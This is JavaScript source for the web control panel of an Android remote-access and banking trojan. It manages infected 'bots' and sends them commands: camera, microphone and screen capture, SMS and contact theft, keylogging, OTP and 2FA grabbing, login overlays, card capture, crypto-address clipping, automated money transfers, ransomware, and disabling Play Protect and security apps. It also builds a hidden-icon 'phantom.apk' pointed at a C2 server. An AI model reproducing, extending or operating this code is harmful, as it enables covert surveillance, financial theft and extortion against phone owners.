const $ = id => document.getElementById(id);
const sel = id => $(id).value;
let TOKEN = localStorage.getItem('pt_token') || '';
let BOTS = [], CUR = null, CONSOLE = {}, CURCMD = '📱 Surveillance';

const ICONS = {
  '📱 Surveillance': ['camera_back','camera_front','cam_dual','mic_record','screenshot','screen_record','gps_once','start_hvnc','stop_hvnc'],
  '💳 Finance': ['balance_scrape','overlay_login','card_capture','otp_grab','tfa_dump','clipper_on','ats_transfer','set_wallet'],
  '📁 Data': ['device_info','installed_apps','battery_status','sim_info','sms_inbox','contacts_list','call_logs','clipboard_get'],
  '⌨️ Keylog': ['keylog_start','keylog_stop','keylogger_get','screen_logs','cred_dump'],
  '⚙️ Device': ['lock','reboot','vibrate','ransomware','factory_reset','self_destruct','silence','update_payload'],
  '🛡️ Security': ['kill_security','disable_pp','grant_perms','block_sms','block_calls']
};
const LABELS = { camera_back:'📸 Rear', camera_front:'🤳 Front', cam_dual:'📸 Dual', mic_record:'🎙️ Mic', screenshot:'🖼️ Screen', screen_record:'📹 Record', gps_once:'📍 GPS', start_hvnc:'🕹️ HVNC On', stop_hvnc:'⏹️ HVNC Off', balance_scrape:'🏦 Balance', overlay_login:'💉 Overlay', card_capture:'💳 Cards', otp_grab:'📲 OTP', tfa_dump:'🔑 2FA', clipper_on:'🔗 Clipper', ats_transfer:'🤖 ATS', set_wallet:'🔄 Wallet', device_info:'📱 Info', installed_apps:'📋 Apps', battery_status:'🔋 Battery', sim_info:'📡 SIM', sms_inbox:'📨 SMS', contacts_list:'👤 Contacts', call_logs:'📞 Calls', clipboard_get:'📋 Clipboard', keylog_start:'▶ Keylog', keylog_stop:'⏹ Keylog', keylogger_get:'📄 Get Keylog', screen_logs:'🪟 Screen Logs', cred_dump:'🗝️ Creds', lock:'🔒 Lock', reboot:'📴 Reboot', vibrate:'📳 Vibrate', ransomware:'⛓️ Ransom', factory_reset:'💥 Reset', self_destruct:'☠️ Destruct', silence:'🔕 Silence', update_payload:'🔄 Update', kill_security:'🛡️ Kill Sec', disable_pp:'🚫 PlayProtect', grant_perms:'🔑 Grant', block_sms:'📵 SMS', block_calls:'📞 Calls' };

function toast(type, msg) {
  const t = document.createElement('div'); t.className = 'toast ' + type;
  t.textContent = msg; $('toasts').appendChild(t);
  setTimeout(() => t.remove(), 3500);
}

async function api(path, method = 'GET', body) {
  const res = await fetch(path, {
    method,
    headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + TOKEN },
    body: body ? JSON.stringify(body) : undefined
  });
  if (res.status === 401) { logout(); throw new Error('Unauthorized'); }
  if (!res.ok) { const e = await res.json().catch(() => ({})); throw new Error(e.error || res.status); }
  return res.json();
}

async function login() {
  const res = await fetch('/api/auth/login', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ user: $('loginUser').value, pass: $('loginPass').value })
  });
  if (!res.ok) return toast('err', 'Invalid credentials');
  const d = await res.json();
  TOKEN = d.token; localStorage.setItem('pt_token', TOKEN);
  $('login').classList.add('hidden'); $('app').classList.remove('hidden');
  $('bServer').value = location.origin;
  loadAll(); setInterval(loadAll, 3000);
}

function logout() { TOKEN = ''; localStorage.removeItem('pt_token'); location.reload(); }

function view(v) {
  document.querySelectorAll('.nav-item').forEach(n => n.classList.toggle('active', n.dataset.v === v));
  document.querySelectorAll('.main section').forEach(s => s.classList.add('hidden'));
  $('v-' + v).classList.remove('hidden');
  if (v === 'cmd') renderCmdCats();
  if (v === 'fin') { fillBots('finBotSel'); fillBots('atsBotSel'); loadWallet(); }
}

async function loadAll() {
  try {
    const [bots, stats, logs] = await Promise.all([
      api('/api/bots'), api('/api/bots/stats'), api('/api/logs?limit=60')
    ]);
    BOTS = bots;
    $('stTotal').textContent = stats.total;
    $('stOnline').textContent = stats.online;
    $('liveCount').textContent = stats.online;
    $('navBots').textContent = stats.total;
    $('stCmds').textContent = logs.length;
    $('stFin').textContent = logs.filter(l => l.level === 'otp' || l.level === 'balance' || l.level === 'ats').length;
    renderBots();
    fillBots('cmdBotSel', true);
    renderLogs(logs);
    if (CUR) refreshConsole();
  } catch (e) { /* transient */ }
}

function renderBots() {
  const row = b => `<tr onclick="openBot('${b.id}')">
    <td><span class="pill ${b.online ? 'on' : 'off'}">${b.online ? '● ONLINE' : '○ OFFLINE'}</span></td>
    <td class="mono" style="color:var(--muted)">${b.id}</td>
    <td style="font-weight:600">${b.model || 'Android'}</td>
    <td>${b.android || '—'}</td>
    <td>${b.country || '—'}</td>
    <td>${b.ip || '—'}</td>
    <td>🔋 ${b.battery}%</td>
    <td style="color:var(--dim)">${b.online ? 'Just now' : new Date(b.lastSeen).toLocaleTimeString()}</td>
    <td style="text-align:right">${b.admin ? '<span class="tag t-red">ADMIN</span>' : ''}</td></tr>`;
  $('botTable').innerHTML = BOTS.filter(b => b.online).map(row).join('') || '<tr><td colspan="6" style="color:var(--dim);text-align:center;padding:24px">No online bots</td></tr>';
  $('botTableFull').innerHTML = BOTS.map(row).join('') || '<tr><td colspan="9" style="color:var(--dim);text-align:center;padding:24px">No bots yet — deploy an APK</td></tr>';
}

function fillBots(id, keep) {
  const cur = $(id).value;
  $(id).innerHTML = BOTS.map(b => `<option value="${b.id}">${b.online ? '🟢' : '🔴'} ${b.id} · ${b.model || '?'}</option>`).join('');
  if (keep && cur) $(id).value = cur;
}

function selectBot(id) {
  CUR = BOTS.find(b => b.id === id) || null;
  $('cmdTarget').textContent = CUR ? `${CUR.id} · ${CUR.model || 'Android'} · ${CUR.online ? '🟢' : '🔴'}` : 'No device';
  $('cmdConsole').innerHTML = '';
  refreshConsole();
}

function renderCmdCats() {
  $('cmdCats').innerHTML = Object.keys(ICONS).map(c => `<div class="cat ${c === CURCMD ? 'active' : ''}" onclick="setCat('${c}')">${c}</div>`).join('');
  $('cmdGrid').innerHTML = ICONS[CURCMD].map(c => {
    const cls = ['self_destruct','factory_reset','ransomware'].includes(c) ? 'danger' : ['balance_scrape','overlay_login','clipper_on','ats_transfer'].includes(c) ? 'gold' : '';
    return `<div class="cmd ${cls}" onclick="execCmd('${c}')">${LABELS[c] || c}</div>`;
  }).join('');
}
function setCat(c) { CURCMD = c; renderCmdCats(); }

async function execCmd(cmd) {
  if (!CUR) return toast('err', 'Select a bot first');
  const args = cmd === 'set_wallet' ? JSON.stringify({ eth: $('wEth').value, btc: $('wBtc').value, trx: $('wTrx').value }) : '';
  try {
    const r = await api('/api/commands/' + CUR.id, 'POST', { cmd, args });
    line('CMD', `→ ${cmd} ${args}`, 'var(--purple)');
    toast(r.delivered ? 'ok' : 'gold', r.delivered ? 'Delivered' : 'Bot offline — queued');
    refreshConsole();
  } catch (e) { toast('err', e.message); }
}

function quickCmd(cmd) { selectBot(CUR ? CUR.id : ''); execCmd(cmd); }

async function refreshConsole() {
  if (!CUR) return;
  try {
    const cmds = await api('/api/commands/' + CUR.id);
    $('cmdConsole').innerHTML = cmds.slice(0, 50).map(c =>
      `<div class="ln"><span class="ts">${new Date(c.created_at).toLocaleTimeString()}</span>` +
      `<span class="tag" style="color:${c.status === 'done' ? 'var(--green)' : c.status === 'failed' ? 'var(--red)' : 'var(--amber)'}">${c.status.toUpperCase()}</span>` +
      `<span>${c.cmd} ${c.args}${c.result ? ' → ' + c.result : ''}</span></div>`).join('') || '<div style="color:var(--dim)">No commands</div>';
  } catch (e) { /* transient */ }
}
function clearConsole() { $('cmdConsole').innerHTML = ''; }
function line(tag, msg, color) {
  const d = document.createElement('div'); d.className = 'ln';
  d.innerHTML = `<span class="ts">${new Date().toLocaleTimeString()}</span><span class="tag" style="color:${color}">${tag}</span><span>${msg}</span>`;
  $('cmdConsole').appendChild(d); $('cmdConsole').scrollTop = $('cmdConsole').scrollHeight;
}

function renderLogs(logs) {
  const C = { otp: ['📲', 'var(--goldbg)', 't-gold'], balance: ['🏦', 'rgba(34,197,94,.1)', 't-green'], ats: ['🤖', 'rgba(139,92,246,.1)', 't-purple'], metrics: ['🖥️', 'rgba(34,211,238,.1)', 't-cyan'], log: ['📡', 'var(--panel2)', ''] };
  const feed = logs.map(l => {
    const [ic, bg, tag] = C[l.level] || C.log;
    return `<div class="feed-item"><div class="fi" style="background:${bg}">${ic}</div><div class="fm">` +
      `<div class="ftitle">${(l.model || l.bot_id || 'bot').toUpperCase()} ${tag ? `<span class="tag ${tag}">${l.level.toUpperCase()}</span>` : ''}</div>` +
      `<div class="fdesc">${l.msg}</div></div><div class="ft">${new Date(l.created_at).toLocaleTimeString()}</div></div>`;
  }).join('');
  $('activityFeed').innerHTML = feed || '<div style="color:var(--dim);padding:18px;text-align:center">No activity</div>';
  $('finFeed').innerHTML = logs.filter(l => ['otp', 'balance', 'ats'].includes(l.level)).map(l =>
    `<div class="feed-item"><div class="fi" style="background:${C[l.level][1]}">${C[l.level][0]}</div><div class="fm"><div class="ftitle">${l.level.toUpperCase()}</div><div class="fdesc">${l.msg}</div></div><div class="ft">${new Date(l.created_at).toLocaleTimeString()}</div></div>`).join('') || '<div style="color:var(--dim);padding:18px;text-align:center">No financial events</div>';
}

function openBot(id) {
  CUR = BOTS.find(b => b.id === id) || null; if (!CUR) return;
  $('modalTitle').textContent = `🤖 ${CUR.id} — ${CUR.model || 'Android'}`;
  $('botDetails').innerHTML =
    `<div class="detail"><div class="k">Status</div><div class="v">${CUR.online ? '🟢 Online' : '🔴 Offline'}</div></div>` +
    `<div class="detail"><div class="k">Android</div><div class="v">${CUR.android || '—'}</div></div>` +
    `<div class="detail"><div class="k">Country</div><div class="v">${CUR.country || '—'}</div></div>` +
    `<div class="detail"><div class="k">IP</div><div class="v">${CUR.ip || '—'}</div></div>` +
    `<div class="detail"><div class="k">Battery</div><div class="v">🔋 ${CUR.battery}%</div></div>` +
    `<div class="detail"><div class="k">Device Admin</div><div class="v">${CUR.admin ? '✅ Granted' : '—'}</div></div>`;
  $('botModal').classList.add('open');
}
function closeModal() { $('botModal').classList.remove('open'); }

/* ── FINANCE ── */
async function loadWallet() {
  if (!sel('finBotSel')) return;
  try {
    const w = await api('/api/finance/wallet/' + sel('finBotSel'));
    $('wEth').value = w.eth || ''; $('wBtc').value = w.btc || ''; $('wTrx').value = w.trx || '';
  } catch (e) { /* ignore */ }
}
async function saveWallet() {
  try {
    await api('/api/finance/wallet/' + sel('finBotSel'), 'POST', { eth: $('wEth').value, btc: $('wBtc').value, trx: $('wTrx').value });
    toast('ok', 'Wallet saved');
  } catch (e) { toast('err', e.message); }
}
async function atsRun() {
  try {
    const r = await api('/api/finance/ats', 'POST', { botId: sel('atsBotSel'), target: $('atsTarget').value, amount: $('atsAmount').value });
    const box = $('atsConsole');
    box.innerHTML = `<div class="ln"><span class="ts">${new Date().toLocaleTimeString()}</span><span class="tag" style="color:var(--cyan)">ATS</span><span>${r.delivered ? 'Executed on device — AtsEngine engaged' : 'Bot offline — queued'}</span></div>`;
    toast(r.delivered ? 'ok' : 'gold', r.delivered ? 'ATS running on device' : 'Queued for delivery');
  } catch (e) { toast('err', e.message); }
}

/* ── BUILDER ── */
async function buildApk() {
  const url = $('bServer').value.trim();
  if (!url) return toast('err', 'C2 URL required');
  $('buildStatus').textContent = 'BUILDING…'; $('buildStatus').className = 'tag t-amber';
  try {
    const res = await fetch('/api/build', {
      method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + TOKEN },
      body: JSON.stringify({ serverUrl: url, appName: $('bName').value, iconHidden: $('bIconHidden').checked })
    });
    if (!res.ok) { const e = await res.json().catch(() => ({})); throw new Error(e.error || 'Build failed'); }
    const blob = await res.blob();
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob); a.download = 'phantom.apk'; a.click();
    URL.revokeObjectURL(a.href);
    $('buildStatus').textContent = 'READY'; $('buildStatus').className = 'tag t-green';
    toast('ok', 'APK built & downloaded');
  } catch (e) { $('buildStatus').textContent = 'FAILED'; $('buildStatus').className = 'tag t-red'; toast('err', e.message); }
}

if (TOKEN) { $('login').classList.add('hidden'); $('app').classList.remove('hidden'); $('bServer').value = location.origin; loadAll(); setInterval(loadAll, 3000); }
